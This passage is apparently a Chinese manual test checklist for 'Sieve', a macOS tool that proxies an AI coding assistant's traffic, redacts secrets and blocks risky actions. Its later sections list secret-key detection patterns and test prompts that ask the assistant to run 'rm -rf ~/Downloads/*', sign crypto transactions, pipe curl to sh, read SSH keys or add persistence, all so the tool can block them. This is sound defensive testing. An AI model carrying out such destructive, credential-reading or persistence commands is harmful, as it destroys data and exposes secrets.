- 图标渲染（bind appState.daemonStatus）：[`Sources/Features/MenuBar/MenuBarController.swift:30`](../../Sources/Features/MenuBar/MenuBarController.swift)（`bindAppState`）
- StatusBarIcon 映射：[`Sources/Features/MenuBar/StatusBarIcon.swift`](../../Sources/Features/MenuBar/StatusBarIcon.swift)

**预期效果：**
- 每种状态对应不同图标颜色/样式
- tooltip 也随状态变化（accessibility）

- [ ] 五状态图标切换正确

### 4.2 Hold 倒计时角标

**操作步骤：**
1. 触发 HIPS 弹窗
2. 观察菜单栏图标旁出现倒计时角标

**代码位置：**
- 角标更新（bind holdRemainingSeconds）：[`Sources/Features/MenuBar/MenuBarController.swift:53`](../../Sources/Features/MenuBar/MenuBarController.swift)（`updateHoldBadge`，`button.title = " " + "\(secs)s"`）

**预期效果：**
- 弹窗显示中：图标旁显示 `XXs` 倒计时
- 弹窗关闭后：角标消失

- [ ] Hold 角标实时更新

### 4.3 Warning 计数 99+ 角标

**操作步骤：**
1. 快速触发超过 3 条 Toast（触发多次出站脱敏事件）
2. 观察菜单栏角标

**代码位置：**
- warning 角标更新：[`Sources/Features/MenuBar/MenuBarController.swift:63`](../../Sources/Features/MenuBar/MenuBarController.swift)（`updateWarningBadge`，`count > 99 ? "99+" : "\(count)"`）

**预期效果：**
- Toast 超过 3 条后：菜单栏显示数字角标（≤99 显示数字，>99 显示 "99+"）

- [ ] Warning 角标 99+ 截断正确

### 4.4 暂停 5/15/30 分钟（强制 ≤30）

**操作步骤：**
1. 点击菜单栏图标打开 Quick Menu
2. 选择暂停时长（5/15/30 分钟）
3. 点击暂停

**代码位置：**
- 暂停请求（强制 bounded 1~30）：[`Sources/Features/MenuBar/MenuBarController.swift:122`](../../Sources/Features/MenuBar/MenuBarController.swift)（`requestPause`，`let bounded = max(1, min(30, minutes))`）
- 乐观更新：[`Sources/Features/MenuBar/MenuBarController.swift:127`](../../Sources/Features/MenuBar/MenuBarController.swift)
- 恢复：[`Sources/Features/MenuBar/MenuBarController.swift:151`](../../Sources/Features/MenuBar/MenuBarController.swift)（`requestResume`，`minutes: 0`）

**预期效果：**
- 暂停后：图标变为 paused 状态，Quick Menu 显示"已暂停至 HH:MM"
- 暂停时长最大 30 分钟（> 30 分钟值被截断）
- 失败回滚：IPC 调用失败时 `appState.updatePaused(false)` 回滚

- [ ] 暂停/恢复功能正常，≤30min 强制

### 4.5 退出二次确认

**操作步骤：**
1. Quick Menu → 退出
2. 确认 Alert 弹出
3. 点击"退出"或"取消"

**代码位置：**
- 确认逻辑：[`Sources/Features/MenuBar/MenuBarController.swift:167`](../../Sources/Features/MenuBar/MenuBarController.swift)（`confirmQuit`，NSAlert + `NSApp.terminate`）

**预期效果：**
- Alert 文字："退出后 daemon 仍会继续运行，但你将看不到 HIPS 弹窗与状态栏图标。"
- "退出"按钮终止 GUI，daemon 继续运行
- "取消"不做任何事

- [ ] 退出二次确认工作正常

### 4.6 失联专用视图

**操作步骤：**
1. `pkill -9 sieve-cli` 使 GUI 失联
2. 等待 3 次重试失败（约 1+2+5 = 8 秒）
3. 打开 Quick Menu

**代码位置：**
- disconnected 专用视图：[`Sources/Features/MenuBar/QuickMenuView.swift:37`](../../Sources/Features/MenuBar/QuickMenuView.swift)（`if case .disconnected(let reason) = appState.daemonStatus { disconnectedSection(reason: reason) }`）

**预期效果：**
- Quick Menu 显示失联专用 UI（非正常状态 UI）
- 显示失联原因（heartbeat timeout / socket missing 等）

- [ ] 失联视图正确展示

---

## 5. Settings 六 Tab

### 5.1 General Tab

**操作步骤：** Settings → General Tab

**代码位置：**[`Sources/Features/Settings/GeneralSettingsView.swift:1`](../../Sources/Features/Settings/GeneralSettingsView.swift)

**验证项：**
- [ ] 开机启动 toggle（SMAppService，失败时显示 orange banner）
- [ ] 主题切换（跟随系统 / 浅色 / 深色）即时生效
- [ ] 语言切换（重启后生效）
- [ ] reduce-motion 覆盖（跟随系统 / 始终减少 / 禁用减少）
- [ ] Toast 时长 Stepper（3-10 秒范围），改完触发 Toast 观察时长

### 5.2 Detection Preset Tab

**操作步骤：** Settings → Detection Preset Tab

**代码位置：**[`Sources/Features/Settings/DetectionPresetView.swift:1`](../../Sources/Features/Settings/DetectionPresetView.swift)

**验证项：**
- [ ] 4 卡片选择（strict / standard / relaxed / custom），切换弹 alert 确认
- [ ] 切换后 Quick Menu 状态区 Preset 更新
- [ ] Custom 模式：规则总览 Table 加载（`sieve.list_rules`）
- [ ] Custom 模式：timeout 和 default 列内联编辑（500ms debounce），修改后 IPC 发送 `sieve.set_preset_overrides`
- [ ] `critical_lock` 行显示为 disabled + tooltip
- [ ] 断连时整个 Tab disabled（`.disabled(isDisconnected)`）
- [ ] -32006 rules_loading 错误：显示 "规则加载中，5s 后重试" 并自动重试
- [ ] -32601 method_not_found：显示 "daemon 版本过旧，不支持此功能"

### 5.3 Privacy & Data Tab

**操作步骤：** Settings → Privacy & Data Tab

**代码位置：**[`Sources/Features/Settings/PrivacyDataSettingsView.swift:1`](../../Sources/Features/Settings/PrivacyDataSettingsView.swift)

**验证项：**
- [ ] "历史记录默认脱敏" toggle（影响 History Inspector 默认状态）
- [ ] 灰名单管理 Sheet（参见 3.3）
- [ ] 清空历史：确认 alert → Touch ID → `sieve.purge_history` → 成功 alert 显示删除条数
- [ ] 清空历史：Touch ID 取消/失败 → 不调 IPC
- [ ] -32007 purge_in_progress：显示"正在清空中，请稍候"
- [ ] -32601 method_not_found：显示 "daemon 版本过旧，不支持清空历史（需升级 daemon）"

### 5.4 Daemon Tab

**操作步骤：** Settings → Daemon Tab

**代码位置：**[`Sources/Features/Settings/DaemonSettingsView.swift:1`](../../Sources/Features/Settings/DaemonSettingsView.swift)

**验证项：**
- [ ] 运行状态区：daemon 版本、协议版本、Preset、audit.db schema 版本、最后握手时间
- [ ] "Reload Config" 按钮 → `sieve.reload_config` → log 显示 system/user rules 数量
- [ ] "Health Check" 按钮 → `sieve.health`（无 UI 反馈，看 log 确认发送）
- [ ] "运行 sieve doctor…" → 打开 Terminal 运行 `sieve doctor`（`/usr/local/bin/sieve doctor`）
- [ ] 断连时按钮 disabled

### 5.5 Updates Tab

**操作步骤：** Settings → Updates Tab

**代码位置：**[`Sources/Features/Settings/UpdatesSettingsView.swift:1`](../../Sources/Features/Settings/UpdatesSettingsView.swift)

**验证项：**
- [ ] "启动时自动检查更新" toggle
- [ ] "立即检查更新" 按钮（触发 Sparkle）
- [ ] 版本信息区显示 GUI 版本和 daemon 版本

### 5.6 About Tab

**操作步骤：** Settings → About Tab

**代码位置：**[`Sources/Features/Settings/UpdatesSettingsView.swift:30`](../../Sources/Features/Settings/UpdatesSettingsView.swift)（`AboutSettingsView`）

**验证项：**
- [ ] 导出诊断包：弹出 SavePanel，导出后 zip 文件不含敏感字段（含 audit.db 脱敏拷贝）
- [ ] 重新运行引导：打开 Onboarding 窗口
- [ ] 版本号显示正确（`CFBundleShortVersionString + CFBundleVersion`）

---

## 6. History 窗口

### 6.1 表格 + Inspector

**操作步骤：**
1. 触发几次 HIPS 决策（Allow + Deny）
2. 打开 History 窗口（菜单栏 → 历史）
3. 点击一条记录

**代码位置：**
- HistoryWindowView：[`Sources/Features/History/HistoryWindowView.swift:1`](../../Sources/Features/History/HistoryWindowView.swift)
- InspectorPanelView：[`Sources/Features/History/InspectorPanelView.swift:1`](../../Sources/Features/History/InspectorPanelView.swift)

**预期效果：**
- 左侧表格显示事件列表（rule_id、severity、direction、user_choice、created_at）
- 右侧 Inspector 显示详情，敏感字段默认脱敏（MaskedField）

- [ ] 表格 + Inspector 正常

### 6.2 筛选搜索 200ms 去抖

**操作步骤：**
1. History 窗口过滤栏中快速输入关键词
2. 观察请求不会每次按键都发送

**代码位置：**
- 200ms debounce：[`Sources/Features/History/HistoryWindowViewModel.swift:27`](../../Sources/Features/History/HistoryWindowViewModel.swift)（`$keywordInput.debounce(for: .milliseconds(200)...)`）

- [ ] 搜索 200ms 去抖正常

### 6.3 分页 + 增量推送

**操作步骤：**
1. 生成 50+ 条历史记录
2. 滚动到底部触发加载更多
3. 触发新事件，观察表格顶部增量更新

**代码位置：**
- 分页：[`Sources/Features/History/HistoryWindowViewModel.swift:70`](../../Sources/Features/History/HistoryWindowViewModel.swift)（`loadMore`，offset 分页）
- 增量推送（file watcher）：[`Sources/Features/History/HistoryWindowViewModel.swift:44`](../../Sources/Features/History/HistoryWindowViewModel.swift)（`reader.startWatching { appendIncremental() }`）

- [ ] 分页 + 增量推送正常

### 6.4 Inspector 默认脱敏 + Touch ID 5min 解锁会话

**操作步骤：**
1. 点击 Inspector 中的 "Touch ID 解锁" 按钮
2. 完成 Touch ID
3. 观察 5 分钟内不再要求解锁
4. 系统锁屏后唤醒，观察解锁会话是否清除

**代码位置：**
- TouchIDService 5min 会话：[`Sources/Services/TouchID/TouchIDService.swift:34`](../../Sources/Services/TouchID/TouchIDService.swift)（`appState.setUnlockSession(UnlockSession())`）
- 锁屏清除：[`Sources/Services/TouchID/TouchIDService.swift:16`](../../Sources/Services/TouchID/TouchIDService.swift)（`observeScreenLock`）
- Inspector 解锁 UI：[`Sources/Features/History/InspectorPanelView.swift:48`](../../Sources/Features/History/InspectorPanelView.swift)

- [ ] Touch ID 5min 会话，锁屏后清除

### 6.5 锁屏唤醒清解锁会话

- 完成 6.4 并在解锁会话有效期内系统锁屏再唤醒
- [ ] 唤醒后 Inspector 回到脱敏状态

### 6.6 CSV/NDJSON 导出 + 进度条 + 取消（强制脱敏）

**操作步骤：**
1. History 窗口右上角点"导出…"
2. 选择 CSV 或 NDJSON 格式
3. 选择保存位置
4. 导出过程中点"取消导出"
5. 完整导出后，用文本编辑器检查文件不含 evidence 原文

**代码位置：**
- 导出按钮：[`Sources/Features/History/HistoryWindowView.swift:52`](../../Sources/Features/History/HistoryWindowView.swift)（`exportButton`）
- 进度条：[`Sources/Features/History/HistoryWindowView.swift:68`](../../Sources/Features/History/HistoryWindowView.swift)（`exportProgressBar`）
- HistoryExporter：[`Sources/Features/History/HistoryExporter.swift`](../../Sources/Features/History/HistoryExporter.swift)
- HistoryExportFormatter：[`Sources/Models/HistoryExportFormatter.swift`](../../Sources/Models/HistoryExportFormatter.swift)
- 确认 dialog 强制脱敏提示：[`Sources/Features/History/HistoryWindowView.swift:42`](../../Sources/Features/History/HistoryWindowView.swift)（Text: "历史记录将强制脱敏（ADR-011），不含 evidence 原文"）

- [ ] 导出进度条正常，取消有效，文件脱敏

### 6.7 在调试窗口重放（跨 Tab 联动）

**操作步骤：**
1. History Inspector 中选一条事件
2. 点击"在调试窗口重放"按钮
3. Debug 窗口应自动跳到"规则评估" Tab 并填入 payload

**代码位置：**
- Inspector 重放按钮：[`Sources/Features/History/InspectorPanelView.swift:61`](../../Sources/Features/History/InspectorPanelView.swift)（`WindowManager.shared.replayInDebug(prompt:)`）
- DebugReplayStore：[`Sources/App/DebugReplayStore.swift`](../../Sources/App/DebugReplayStore.swift)
- RuleEvaluationTab 监听 replayStore：[`Sources/Features/Debug/DebugWindowView.swift:183`](../../Sources/Features/Debug/DebugWindowView.swift)（`applyPrefilledIfNeeded`）

**预期效果：**
- Debug 窗口自动激活，切换到"规则评估" Tab
- payload 填入历史事件的 rule_id 相关内容
- Banner 显示"已从历史记录填入 payload"

- [ ] 历史重放跨 Tab 联动正常

### 6.8 schema v2 字段在 v1 schema 下显示"—"

**操作步骤：**

- 用旧版 daemon（schema v1）运行，观察 Inspector 中 v2 新增字段是否显示"—"而非崩溃

**代码位置：** `Sources/Services/AuditDB/AuditDBReader.swift`（读取时对 v2 新增列做 optional 处理）

- [ ] 向后兼容，v2 字段降级为"—"

---

## 7. Debug 四 Tab

### 7.1 实时事件 + grep 200ms 去抖 + 暂停快照

**操作步骤：**
1. Debug 窗口 → "实时事件" Tab
2. 触发一些事件（HIPS 决策、IPC 消息）
3. 在 grep 框快速输入关键词
4. 点击"暂停"，触发新事件，观察列表不滚动
5. 点击"恢复"，观察列表更新

**代码位置：**
- LiveEventsTab：[`Sources/Features/Debug/DebugWindowView.swift:32`](../../Sources/Features/Debug/DebugWindowView.swift)
- grep 200ms debounce：[`Sources/Features/Debug/DebugWindowView.swift:57`](../../Sources/Features/Debug/DebugWindowView.swift)（`DispatchQueue.main.asyncAfter(deadline: .now() + 0.2, execute: work)`）
- 暂停按钮：[`Sources/Features/Debug/DebugWindowView.swift:70`](../../Sources/Features/Debug/DebugWindowView.swift)（`buffer.paused.toggle()`，ring buffer 继续记录）

**预期效果：**
- grep 快速输入不每次按键刷新（200ms 去抖）
- 暂停后：UI 冻结，ring buffer 继续记录（恢复后一次性更新）

- [ ] 实时事件过滤和暂停正常

### 7.2 规则评估 sieve.evaluate（≤64KB）

**操作步骤：**
1. Debug → "规则评估" Tab
2. 输入测试 payload（参见 0.2 节测试数据）
3. 点击"评估"

**代码位置：**
- RuleEvaluationTab：[`Sources/Features/Debug/DebugWindowView.swift:121`](../../Sources/Features/Debug/DebugWindowView.swift)
- 64KB 限制（UI + IPC）：[`Sources/Features/Debug/DebugWindowView.swift:160`](../../Sources/Features/Debug/DebugWindowView.swift)（`payload.utf8.count > 65536` 时按钮 disabled 且文字变红）
- evaluate IPC 调用：[`Sources/Features/Debug/DebugWindowView.swift:189`](../../Sources/Features/Debug/DebugWindowView.swift)（`sieve.evaluate`）

**预期效果：**
- 输入触发规则的 payload → 结果区显示命中 rule_id、severity、disposition
- 超过 64KB：字节数变红，评估按钮 disabled
- 历史重放填入 payload 时显示 banner

- [ ] sieve.evaluate 正常，64KB 限制生效

### 7.3 IPC 监视 ring buffer + 详情面板（永不展示 params）

**操作步骤：**
1. Debug → "IPC 监视" Tab
2. 进行 HIPS 决策等操作，观察消息流
3. 点击一条消息查看详情面板

**代码位置：**
- IPCMonitorTab：[`Sources/Features/Debug/DebugWindowView.swift:220`](../../Sources/Features/Debug/DebugWindowView.swift)
- params 不展示（硬红线）：[`Sources/Features/Debug/DebugWindowView.swift:276`](../../Sources/Features/Debug/DebugWindowView.swift)（`Text("params: 不展示")`）
- 详情面板 params 红线说明：[`Sources/Features/Debug/DebugWindowView.swift:305`](../../Sources/Features/Debug/DebugWindowView.swift)（`Text("params 不展示（SPEC-005 红线）")`）

**预期效果：**
- 消息流列表：method、id、bytes、timestamp、方向
- 右侧详情面板：展示 method/id/bytes/timestamp，params 区域只显示"params 不展示（SPEC-005 红线）"
- heartbeat 消息不出现（已过滤）

- [ ] IPC 监视正常，params 从不展示

### 7.4 系统状态 sieve.health + 文件系统权限校验

**操作步骤：**
1. Debug → "系统状态" Tab
2. 观察自动显示的状态信息

**代码位置：**
- SystemStatusTab：[`Sources/Features/Debug/DebugWindowView.swift:336`](../../Sources/Features/Debug/DebugWindowView.swift)（大约）

**预期效果：**
- `sieve.health` 返回 daemon 状态
- 文件系统权限校验：`~/.sieve/` 应是 0700，`ipc.sock` 应是 0600

- [ ] 系统状态和权限校验正常

---

## 8. Onboarding

### 8.1 6 步流程 + 左 sidebar

**操作步骤：**
1. Settings → About → "重新运行引导"
2. 或首次安装时自动弹出

**代码位置：**
- OnboardingView：[`Sources/Features/Onboarding/OnboardingView.swift:1`](../../Sources/Features/Onboarding/OnboardingView.swift)
- 6 步标题：[`Sources/Features/Onboarding/OnboardingView.swift:56`](../../Sources/Features/Onboarding/OnboardingView.swift)（`["欢迎", "环境检查", "通知权限", "开机启动", "Preset 选择", "完成"]`）

**预期效果：**
- 左侧 sidebar 显示 6 步，已完成步骤有绿色勾，当前步骤有蓝色点

- [ ] 6 步流程，sidebar 状态正确

### 8.2 sieve doctor 实际运行

**操作步骤：**
1. Onboarding Step 2（环境检查）
2. 点击"运行 sieve doctor"

**代码位置：**[`Sources/Features/Onboarding/OnboardingView.swift`](../../Sources/Features/Onboarding/OnboardingView.swift)（doctorStep 区域）

- [ ] sieve doctor 运行，结果显示

### 8.3 通知权限请求

**操作步骤：** Onboarding Step 3

**代码位置：**[`Sources/Features/Onboarding/OnboardingView.swift`](../../Sources/Features/Onboarding/OnboardingView.swift)（notificationStep，`UNUserNotificationCenter.current().requestAuthorization`）

- [ ] 通知权限请求对话框弹出

### 8.4 SMAppService 登录项

**操作步骤：** Onboarding Step 4

**代码位置：**[`Sources/Features/Onboarding/OnboardingView.swift`](../../Sources/Features/Onboarding/OnboardingView.swift)（loginItemStep，`SMAppService.mainApp.register()`）

- [ ] 登录项注册成功（或失败时有引导前往 System Settings）

### 8.5 Preset 选择

**操作步骤：** Onboarding Step 5，选择并确认 Preset

- [ ] Preset 选择后发送 `sieve.set_preset`

### 8.6 Step 6 demo 触发 sieve.evaluate + HIPS 弹窗

**操作步骤：** Onboarding Step 6（完成页），点击 demo 按钮

**代码位置：**[`Sources/Features/Onboarding/OnboardingView.swift`](../../Sources/Features/Onboarding/OnboardingView.swift)（finishStep 区域，触发 `ipcClient.sendRequest(method: "sieve.evaluate" ...)`）

**预期效果：**
- 发送 evaluate 请求（演示用 payload）
- 触发 HIPS 弹窗演示（仅演示用，不影响真实决策）

- [ ] Step 6 demo 正常

---

## 9. Toast + 系统通知

### 9.1 Toast 5s 内同 kind+rule_id 合并

**操作步骤：**
1. 快速连续触发同一规则的出站脱敏事件（< 5s 内）
2. 观察 Toast 是否合并（计数增加而非新建）

**代码位置：**
- 合并逻辑：[`Sources/Features/Toast/ToastController.swift:42`](../../Sources/Features/Toast/ToastController.swift)（`if let existingIdx = stack.firstIndex(where: { $0.kind == params.kind && $0.ruleId == params.ruleId && Date().timeIntervalSince($0.firstSeenAt) < 5 })`）

- [ ] 5s 内同规则 Toast 合并

### 9.2 上限 3 条 + 超过转 warning 角标

**操作步骤：**
1. 触发 > 3 条不同规则的 Toast 事件
2. 观察第 4 条开始不显示新 Toast，但菜单栏角标计数增加

**代码位置：**
- 上限判断：[`Sources/Features/Toast/ToastController.swift:50`](../../Sources/Features/Toast/ToastController.swift)（`if stack.count >= 3 { return }`）

- [ ] Toast 上限 3 条，超出转角标

### 9.3 用户时长 3-10s（kToastDurationSeconds）

**操作步骤：**
1. Settings → General → Toast 时长 Stepper 调整为 3s
2. 触发 Toast，观察自动消失时间

**代码位置：**
- 时长使用：[`Sources/Features/Toast/ToastController.swift:96`](../../Sources/Features/Toast/ToastController.swift)（`let duration = TimeInterval(appState.settings.toastDurationSeconds)`）

- [ ] Toast 时长设置生效

### 9.4 点 Toast 跳历史窗口

**操作步骤：**
1. 触发 Toast
2. 点击 Toast（非关闭按钮）
3. 观察 History 窗口是否自动打开并定位到对应记录

**代码位置：**
- `handleTap` 回调：[`Sources/Features/Toast/ToastController.swift:73`](../../Sources/Features/Toast/ToastController.swift)（`ToastView(entry: entry, onTap: { handleTap(entry) }, ...)`）

- [ ] 点 Toast 跳历史窗口

### 9.5 reduce-motion 路径

- 开启 reduce-motion 后触发 Toast，观察无动画
- [ ] Toast reduce-motion 适配

### 9.6 失联 / 重连 Toast

**操作步骤：**
1. `pkill -9 sieve-cli`，等待 GUI 断连 → 重启 daemon
2. 观察重连 Toast

**代码位置：**
- 重连 Toast：[`Sources/Features/Toast/ToastController.swift:14`](../../Sources/Features/Toast/ToastController.swift)（`presentReconnect`）
- daemon 重启 Toast 文字："Sieve daemon 已重启，状态可能丢失"
- 仅断连 Toast 文字："已重新连接 daemon"

**预期效果：**
- daemon 重启（boot_id 变化）：Toast "Sieve daemon 已重启，状态可能丢失"
- 仅断连重连（boot_id 相同）：Toast "已重新连接 daemon"
- 首次连接：无重连 Toast（`checkAndUpdateDaemonBootId` 返回 nil）

- [ ] 重连 Toast 三种情况正确区分

---

## 10. 重连 + 失联场景

### 10.1 daemon 重启 → boot_id 变化 toast "Sieve daemon 已重启"

**操作步骤：**
1. GUI 与 daemon 连接中
2. `pkill -9 sieve-cli && SIEVE_LOG=info cargo run -p sieve-cli -- start --config /tmp/sieve-test.toml`
3. 等待 GUI 自动重连

**代码位置：**
- boot_id 比对：[`Sources/App/AppStateIPCAdapter.swift`](../../Sources/App/AppStateIPCAdapter.swift)（`checkAndUpdateDaemonBootId`）
- IPCRouter 三路判定：[`Sources/Services/IPC/IPCRouter.swift:39`](../../Sources/Services/IPC/IPCRouter.swift)（`if let kind = self.appStateAdapter?.checkAndUpdateDaemonBootId(params.daemonBootId) { self.toastController?.presentReconnect(kind) }`）

- [ ] daemon 重启 Toast 出现

### 10.2 仅断连 → boot_id 相同 toast "已重新连接"

**操作步骤：**
1. 临时断开网络或用 `pkill sieve-cli`（让 daemon 能立即重启，boot_id 应不同）
2. 更精确的测试：修改 `ipc.sock` 权限使连接中断，再恢复
3. 观察重连 Toast 文字

- [ ] 仅断连 Toast 正确

### 10.3 首次连接 → 无 Toast / "Connected"

**操作步骤：**
1. 关闭 GUI，重新启动 GUI
2. 观察菜单栏 Toast 区

- [ ] 首次连接无 Toast

### 10.4 重连后 inflight 全部 fail（不重发）

**操作步骤：**
1. HIPS 弹窗显示中（或 Settings 调用进行中）
2. 断开 daemon 再重连
3. 观察 inflight 请求状态

**代码位置：**
- inflight 清空（不重发）：[`Sources/Services/IPC/IPCClient.swift:327`](../../Sources/Services/IPC/IPCClient.swift)（`inflight.clearAndDiscard()`）

**预期效果：**
- 重连后所有 inflight 请求标记失败（UI 侧等待 IPC 响应的调用收到 `.canceled` 错误）
- 不重新发送旧请求

- [ ] 重连后 inflight 全部 fail，不重发

### 10.5 重连后 HIPS 显示中的弹窗自动关闭

**操作步骤：**
1. 触发 HIPS 弹窗（显示中不关闭）
2. 重启 daemon
3. 等待 GUI 重连

**代码位置：**
- 关闭 stale 弹窗入口：[`Sources/Features/HIPS/HipsPanelManager.swift:60`](../../Sources/Features/HIPS/HipsPanelManager.swift)（`closeAllActiveDialogs`）

- [ ] 重连后 stale HIPS 弹窗自动关闭

---

## 11. v2.0+ 兼容扩展

### 11.1 sieve.list_rules

**操作步骤：**
1. Settings → Detection Preset → Custom 模式
2. 页面 `onAppear` 自动调用 `sieve.list_rules`
3. 规则总览 Table 加载

**代码位置：**
- 调用：[`Sources/Features/Settings/DetectionPresetView.swift:49`](../../Sources/Features/Settings/DetectionPresetView.swift)（`if !rulesUnavailable && liveRules.isEmpty { Task { await refreshRules() } }`）
- 错误降级：[`Sources/Features/Settings/DetectionPresetView.swift:17`](../../Sources/Features/Settings/DetectionPresetView.swift)（`rulesUnavailable: Bool`，`rulesError: String?`）

**预期效果：**
- 规则表格加载成功，显示所有已注册规则
- -32006（rules_loading）：5s 后自动重试
- -32601（method_not_found）：显示"daemon 版本过旧"，按钮 disabled

- [ ] list_rules 正常，两种错误降级

### 11.2 sieve.purge_history

详见 5.3 节"清空历史"流程。

**代码位置：**
- 调用：[`Sources/Features/Settings/PrivacyDataSettingsView.swift:86`](../../Sources/Features/Settings/PrivacyDataSettingsView.swift)（`sieve.purge_history`）
- 错误码 -32007：[`Sources/Features/Settings/PrivacyDataSettingsView.swift`](../../Sources/Features/Settings/PrivacyDataSettingsView.swift)（错误处理区域）

- [ ] purge_history 正常，-32007 降级

### 11.3 sieve.set_preset_overrides

详见 5.2 节 Custom 模式内联编辑。

**代码位置：**[`Sources/Features/Settings/DetectionPresetView.swift`](../../Sources/Features/Settings/DetectionPresetView.swift)（`applyOverride` 方法）

- [ ] set_preset_overrides 500ms debounce 正常

---

## 12. 出站脱敏（OUT-01~OUT-12，不弹窗，状态栏 5s 通知）

> 出站脱敏走 `auto_redact` disposition：daemon 自动改写 body bytes，不发 `request_decision` 给 GUI，只发 `sieve.notify_status_bar`。GUI 收到后展示 Toast（不弹 HIPS 弹窗）。

**通用验证方式：**
```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p "包含以下内容的消息：<测试数据>"
```
观察：Toast 出现（5s 后消失）、无 HIPS 弹窗、Claude 侧收到的响应中对应字段已脱敏。

| 规则 | 描述 | 测试 payload 关键词 | severity | 预期 |
|------|------|-------------------|----------|------|
| OUT-01 | Anthropic API Key | `sk-ant-api03-` 前缀 + 93 char | critical | Toast 出现，响应中 key 被 redact |
| OUT-02 | OpenAI API Key | `T3BlbkFJ` 特征串 | critical | Toast 出现 |
| OUT-03 | AWS Access Key ID | `AKIA` / `ASIA` 前缀 + 16 char | critical | Toast 出现（注意 `AKIAIOSFODNN7EXAMPLE` allowlisted） |
| OUT-04 | GitHub PAT | `ghp_` 前缀 + 36 char | critical | Toast 出现 |
| OUT-05 | GCP API Key | `AIza` 前缀 + 35 char | high | Toast 出现 |
| OUT-06 | JWT Token | `eyJ...` 三段结构 | high | 触发 HIPS 弹窗（`gui_popup`，timeout=15s） |
| OUT-07 | PEM 私钥 | `-----BEGIN RSA PRIVATE KEY-----` | critical | 触发 HIPS 弹窗（`gui_popup`，timeout=60s） |
| OUT-08 | Stripe Live Key | `sk_live_` / `pk_live_` 前缀 | critical | 触发 HIPS 弹窗（`gui_popup`，timeout=15s） |
| OUT-09 | Slack Token | `xoxb-` / `xoxp-` 前缀 | high | 触发 HIPS 弹窗（`gui_popup`，timeout=60s） |
| OUT-10 | OpenSSH 私钥 | `-----BEGIN OPENSSH PRIVATE KEY-----` | critical | 触发 HIPS 弹窗 |
| OUT-11 | Discord Bot Token | 三段 `.` 分隔 base64url | high | status_bar 通知（`status_bar` disposition） |
| OUT-09 BIP39 | BIP39 助记词（second-pass） | 有效 12/24 词 mnemonic | critical | 触发 HIPS 弹窗（仅 checksum 通过时） |

- [ ] OUT-01 Anthropic API Key 脱敏
- [ ] OUT-02 OpenAI API Key 脱敏
- [ ] OUT-03 AWS AKIA 脱敏（`AKIAIOSFODNN7EXAMPLE` 不触发）
- [ ] OUT-04 GitHub PAT 脱敏
- [ ] OUT-05 GCP API Key 脱敏
- [ ] OUT-06 JWT Token 触发 HIPS 弹窗（15s timeout）
- [ ] OUT-07 PEM 私钥触发 HIPS 弹窗（60s timeout）
- [ ] OUT-08 Stripe Live Key 触发 HIPS 弹窗（15s timeout）
- [ ] OUT-09 Slack Token 触发 HIPS 弹窗
- [ ] OUT-10 OpenSSH 私钥触发 HIPS 弹窗
- [ ] OUT-11 Discord Token status_bar 通知
- [ ] OUT-09 BIP39 checksum 通过触发 HIPS，checksum 失败不触发 Critical

---

## 13. 入站防御

### 13.1 GUI 类（IN-CR-01 / IN-CR-05）：hold 流 + keep-alive + 用户确认

> 这类规则使用 `gui_popup` disposition，daemon 发 `request_decision` 给 GUI，hold SSE 流，等用户决策。

**IN-CR-01 地址替换攻击：**

- 触发需要 daemon 的 `address_guard`（Levenshtein 检测），需真实 EVM 地址对比
- 测试方式：在 inbound 响应中包含两个 Levenshtein 距离 ≤ 2 的以太坊地址
- 预期：HIPS 弹窗，60s timeout，default_on_timeout = block

- [ ] IN-CR-01 地址替换触发弹窗

**IN-CR-05 签名工具调用：**

```bash
# 让 Claude Code 调用 eth_signTypedData_v4
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p \
  "使用 eth_signTypedData_v4 RPC 方法对这条消息进行签名"
```

- 预期：HIPS 弹窗，120s timeout，Critical，主按钮锁拒绝

- [ ] IN-CR-05 EVM 签名拦截
- [ ] IN-CR-05 Solana 签名拦截（`signTransaction` / `signMessage`）
- [ ] IN-CR-05 Bitcoin 签名拦截

### 13.2 Hook 类（IN-CR-02 ~ IN-CR-04）：写 IPC pending file，不修改 SSE 流

> 这类规则通过 `hook_terminal` disposition，由 `sieve-hook` 二进制处理（写 pending file），不经过 GUI 弹窗。GUI 只收到 `sieve.notify_status_bar` 通知。

```bash
# 触发 IN-CR-02 rm -rf
ANTHROPIC_BASE_URL=http://127.0.0.1:11453 claude --bare -p \
  "帮我清理磁盘：rm -rf ~/Downloads/*"
```

**预期效果：**
- Claude Code hook 收到 EXIT_CODE=1（阻断）
- GUI 侧出现 Toast（`sieve.notify_status_bar`）
- 无 HIPS 弹窗

- [ ] IN-CR-02 rm -rf 被 hook 阻断
- [ ] IN-CR-02-CURL-PIPE curl pipe sh 被阻断
- [ ] IN-CR-02-EVAL eval 命令被阻断
- [ ] IN-CR-03 SSH 私钥路径访问（warn 级别，显示 Toast）
- [ ] IN-CR-04 持久化（crontab / launchctl / shell rc append）被 hook 阻断

### 13.3 IN-SEQ-*：行为序列检测，仅 StatusBar 通知（GA 默认关闭）

> IN-SEQ-01/02/03 在 GA 默认关闭（需 `--features sequence_detection`）。联调时如需测试，需重新构建 daemon：

```bash
cargo build -p sieve-cli --features sieve-cli/sequence_detection
```

**IN-SEQ-01**（侦察→外泄序列）：
1. 先触发 `Read(id_rsa)` 类 tool_use
2. 紧接着触发 `WebFetch` 到外部 URL
3. 预期：StatusBar 通知（不阻断）

**IN-SEQ-02**（下载→清除序列）：
1. `Bash(curl ...)` + `Bash(rm ...)`
2. 预期：StatusBar 通知

**IN-SEQ-03**（持久化序列）：
1. 连续 3 个 persistence 类 tool_use
2. 预期：StatusBar 通知

- [ ] IN-SEQ-01 侦察→外泄序列通知（需 sequence_detection feature）
- [ ] IN-SEQ-02 下载→清除序列通知
- [ ] IN-SEQ-03 持久化序列通知

---

## 14. 安全 / 红线

### 14.1 决策路径不联网（断网验证）

**操作步骤：**
1. 断开 Mac 网络（Wi-Fi 关闭 + 以太网拔掉）
2. 触发 HIPS 弹窗
3. 做出允许/拒绝决策

**预期效果：**
- 弹窗正常工作，决策正常发送到本地 daemon
- 无任何网络请求（可用 Little Snitch 或 `lsof -i` 验证）

- [ ] 断网下决策路径正常

### 14.2 不存原始 prompt（弹窗关闭后 log 无内容）

**操作步骤：**
1. 触发 HIPS 弹窗
2. 做出决策，弹窗关闭
3. 检查 GUI log

```bash
grep -i "abandon\|sk-ant-api\|PRIVATE KEY" ~/.sieve/gui.log
# 应无任何结果
```

**代码位置：**
